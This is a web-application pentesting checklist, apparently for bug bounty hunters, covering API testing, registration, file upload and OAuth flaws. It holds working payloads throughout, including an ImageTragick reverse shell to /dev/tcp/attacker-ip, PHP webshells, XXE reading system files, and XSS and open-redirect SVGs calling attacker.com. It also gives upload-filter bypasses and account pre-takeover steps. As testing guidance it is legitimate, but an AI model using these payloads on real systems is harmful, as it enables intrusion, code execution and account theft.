## API Security

- API Security
    - 31 Days of API Security Testing
        - [ ]  To change versions: `api/v3/login` → `api/v1/login`
        - [ ]  Check other AuthN endpoints: `/api/mobile/login` → `/api/v3/login` `/api/magic_link`
        - [ ]  Verb Tampering: `GET /api/trips/1` → `POST /api/trips/1` `POST /api/trips` `DELETE /api/trips/1`
        - [ ]  Try Object IDs in HTTP headers and bodies, URLs tend to be less vulnerable.
        - [ ]  Try Numeric IDs when facing a GUID/UUID: `GET /api/users/6b95d962-df38` → `GET /api/users/1`
        - [ ]  Wrap ID with an array: `{"id":111}` → `{"id":[111]}`
        - [ ]  Wrap ID with a JSON object: `{"id":111}` → `{"id":{"id":111}}`
        - [ ]  HTTP Parameter Pollution: `/api/profile?user_id=legit&user_id=victim` `/api/profile?user_id=victim&user_id=legit`
        - [ ]  JSON Parameter Pollution: `{"user_id":legit,"user_id":victim}` `{"user_id":victim,"user_id":legit}`
        - [ ]  Wildcard instead of ID: `/api/users/1` → `/api/users/*` `/api/users/%` `/api/users/_` `/api/users/.`
        - [ ]  Ruby application HTTP parameter containing a URL → Pipe as the first character and then a shell command.
        - [ ]  Developer APIs differs with mobile and web APIs. Test them separately.
        - [ ]  Change Content-Type to `application/xml` and see if the API parse it.
        - [ ]  Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to bypass AuthZ, AuthN, rate limiting & input validation.
        - [ ]  Export Injection if you see `Convert to PDF` feature.
        - [ ]  Expand your attack surface and test old versions of [APKs](https://apkpure.com) IPAs.
    - Misc
        - Google Dorks

        ```
        site:target.tld inurl:api
        site:target.tld intitle:"index of" "api.yaml"
        site:target.tld inurl:/application.wadl
        site:target.tld ext:wsdl inurl:/%24metadata
        site:target.tld ext:wadl
        site:target.tld ext:wsdl
        user filetype:wadl
        user filetype:wsdl
        ```

        - Check different `Content-Types`

        ```
        x-www-form-urlencoded --> user=test
        application/json --> {"user": "test"}
        application/xml --> <user>test</user>
        ```

        - If it's regular POST data try sending arrays, dictionaries

        ```
        username[]=John
        username[$neq]=lalala
        ```

        - If JSON is supported try to send unexpected data types

        ```
        {"username": "John"}
        {"username": true}
        {"username": null}
        {"username": 1}
        {"username": [true]}
        {"username": ["John", true]}
        {"username": {"$neq": "lalala"}}
        ```

        - If XML is supported, check for XXE

### References:
* https://github.com/inonshk/31-days-of-API-Security-Tips
* https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting

## Authentication

- Registration
    - Input validation
        - [ ]  Space manipulation & Using Dots & Case sensivity check
        - [ ]  Checking allowed characters (`<> " '`)
        - [ ]  Register using `myemail%00@email.com` or (%0d, %0a)
        - [ ]  Register using `myemail@target.com`
            - Response manipulate from `401 Unauthorized` to `200 Ok` or `302 Found`
    - Analysis
        - [ ]  Check `.js` file on the page, such as `login.js`
        - [ ]  Check the parameters used on the endpoint
            - Might be listed in the `source` or `js`
        - [ ]  Checking the Mobile Endpoint
            - Does it have the same protection as webapp?
            - How does it treat Unicode characters?
        - [ ]  Google Dorks
            - `site:example.com inurl:register inurl:&`
            - `site:example.com inurl:signup inurl:&`
            - `site:example.com inurl:join inurl:&`
    - Misc
        - [ ]  Email Takeover
            - Register an Email, before confirming, change the email. check if the new confirmation email is sent to the first registered email.

## Upload Function

- Upload Function
    - Extensions Impact
        - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
        - `SVG`: Stored XSS, SSRF, XXE
        - `GIF`: Stored XSS, SSRF
        - `CSV`: CSV injection
        - `XML`: XXE
        - `AVI`: LFI, SSRF
        - `HTML`, `JS` : HTML injection, XSS, Open redirect
        - `PNG`, `JPEG`: Pixel flood attack (DoS)
        - `ZIP`: RCE via LFI, DoS
        - `PDF`, `PPTX`: SSRF, BLIND XXE
    - Blacklisting Bypass
        - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
        - ASP → `asp`, `.aspx`, `.cer`, `.asa`
        - Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
        - Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
        - Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
    - Whitelisting Bypass
        - `file.jpg.php`
        - `file.php.jpg`
        - `file.php.blah123jpg`
        - `file.php%00.jpg`
        - `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
        - `file.php%00`
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php.....`
        - `file.php/`
        - `file.php.\`
        - `file.php#.png`
        - `file.`
        - `.html`
    - Vulnerabilities
        - [ ]  Directory Traversal
            - Set filename `../../etc/passwd/logo.png`
            - Set filename `../../../logo.png` as it might changed the website logo.
        - [ ]  SQL Injection
            - Set filename `'sleep(10).jpg`.
            - Set filename `sleep(10)-- -.jpg`.
        - [ ]  Command Injection
            - Set filename `; sleep 10;`
        - [ ]  SSRF
            - Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
            - SSRF Through `.svg` file.

            ```php
            <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
            ```

        - [ ]  ImageTragic

            ```
            push graphic-context
            viewbox 0 0 640 480
            fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
            pop graphic-context
            ```

        - [ ]  XXE
            - Upload using `.svg` file

            ```xml
            <?xml version="1.0" standalone="yes"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
            <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
               <text font-size="40" x="0" y="16">&xxe;</text>
            </svg>
            ```

            ```xml
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
                <image xlink:href="expect://ls"></image>
            </svg>
            ```

            - Using excel file
        - [ ]  XSS
            - Set file name `filename="svg onload=alert(document.domain)>"` , `filename="58832_300x300.jpg<svg onload=confirm()>"`
            - Upload using `.gif` file

            ```
            GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
            ```

            - Upload using `.svg` file

            ```xml
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
            ```

            ```xml
            <?xml version="1.0" standalone="no"?>
            <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

            <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
               <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
               <script type="text/javascript">
                  alert("HolyBugx XSS");
               </script>
            </svg>
            ```

        - [ ]  Open Redirect
            1. Upload using `.svg` file

            ```xml
            <code>
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <svg
            onload="window.location='https://attacker.com'"
            xmlns="http://www.w3.org/2000/svg">
            <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
            </svg>
            </code>
            ```

    - Content-ish Bypass
        - [ ]  Content-type validation
            - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
            to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
        - [ ]  Content-Length validation
            - Small PHP Shell

            ```php
            (<?=`$_GET[x]`?>)
            ```

        - [ ]  Content Bypass Shell
            - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )

            ```php
            GIF89a; <?php system($_GET['cmd']); ?>
            ```

    - Misc
        - [ ]  Uploading `file.js` & `file.config` (web.config)
        - [ ]  Pixel flood attack using image
        - [ ]  DoS with a large values name: `1234...99.png`
        - [ ]  Zip Slip
            - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
        - [ ]  Image Shell
            - Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

            ```php
            exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
            ```

# OAuth Checklist

## Table Of Contents

- OAuth Roles
- Code Flaws
- Redirect_uri Flaws
- State Flaws
- Evil App
- Misc

## OAuth

- OAuth
    - OAuth Roles
        - Resource Owner → User
        - Resource Server → Twitter
        - Client Application → Twitterdeck.com
        - Authorization Server → Twitter
        - client_id → Twitterdeck ID (This is a public, non-secret unique identifier.)
        - client_secret → Secret Token known to the Twitter and Twitterdeck to generate `access_tokens`.
        - response_type → Defines the token type e.g (code, token, etc.)
        - scope → The requested level of access Twitterdeck wants.
        - redirect_uri → The URL user is redirected to after the authorization is complete.
        - state → Main CSRF protection in OAuth, can persist data between the user being directed to the authorization server and back again.
        - grant_type → Defines the `grant_type` and the returned token type.
        - code → The authorization code twitter generated, will be like `?code=`, the code is used with client_id and client_secret to fetch an `access_token`.
        - access_token → The token twitterdeck uses to make API requests on behalf of the user.
        - refresh_token → Allows an application to obtain a new `access_token` without prompting the user.
    - Code Flaws
        - [ ]  Re-Using the code.
        - [ ]  Code Predict/Bruteforce and Rate-limit?
        - [ ]  Is the code for application X valid for application Y?
    - Redirect_uri Flaws
        - [ ]  URL isn't validated at all: `?redirect_uri=https://attacker.com`
        - [ ]  Subdomains allowed (Subdomain Takeover or Open redirect on those subdomains): `?redirect_uri=https://sub.twitterdeck.com`
        - [ ]  Host is validated, path isn't (Chain open redirect): `?redirect_uri=https://twitterdeck.com/callback?redirectUrl=https://evil.com`
        - [ ]  Host is validated, path isn't (Referer leakages): Include external content on HTML page and leak code via `Referer`.
        - [ ]  Weak Regexes:

        ```
        ?redirect_uri=https://twitterdeck.com.evil.com
        ?redirect_uri=https://twitterdeck.com%252eevil.com
        ?redirect_uri=https://twitterdeck.com//evil.com/
        ?redirect_uri=https://twitterdeck.com%09evil.com
        ```

        - [ ]  Bruteforcing the [URL encoded chars](https://pastebin.com/raw/b7HsBvZ7) after host: `?redirect_uri=https://twitterdeck.com§FUZZ§`
        - [ ]  Bruteforcing the [keywords](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-words.txt) whitelist after host (or on any whitelist open redirect filter): `?redirect_uri=https://§FUZZ§.com`
            - Imagine "twitter" keyword is allowed so we use: `?redirect_uri=https://eviltwitter.com`
        - [ ]  URI validation in place: use typical open redirect payloads.
    - State Flaws
        - [ ]  Missing `State` parameter? (CSRF)
        - [ ]  Predictable `State` parameter?
        - [ ]  Is `State` parameter being verified?

        **What is the CSRF workflow in case of `state` problems?**

        - Attacker generate a valid `authorization_code` link for himself and doesn't use it (doesn't forward the request)
        - Attacker sends the link to the logged-in victim, and if the victim opens the link, attacker's OAuth account will be linked to victim's.
    - Evil App
        - [ ]  Race condition when `code` is exchanged for `access_token`
        - [ ]  Race condition when `refresh_token` is exchanged for `access_token`
        - [ ]  If user revocates access, will code be also revocated?
    - Misc
        - [ ]  Is `client_secret` validated?
        - [ ]  Are `client_secret`, `access_token`, `refresh_token` leaking somewhere?
        - [ ]  Pre ATO using facebook phone-number signup
            - Register on facebook using a phone-number and it settings add the victim's email address (do not verify it).
            - Use the facebook OAuth on the target website, it might be possible that the application doesn't verify the victim's email.
            - [Reference](https://akshanshjaiswal.medium.com/pre-access-to-victims-account-via-facebook-signup-60219e9e381d)
        - [ ]  No email validation Pre ATO
            - Register as the victim with his email and your desired password.
            - The victim then tries to login using OAuth such as google or facebook.
            - The application queries the database and respond with: `email already exists.` and links their account to the attackers.
            - If there is no un-link option on the application, the attacker can always login on behalf of the user using OAuth even if they reset password.
    - References
        - [HackerScroll](https://github.com/hackerscrolls/SecurityTips/blob/master/MindMaps/OAuth_bugs.png)
        - [The wonderful world of OAuth](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
        - [Pentester.land write ups](https://pentester.land/list-of-bug-bounty-writeups.html)

**By: HolyBugx**
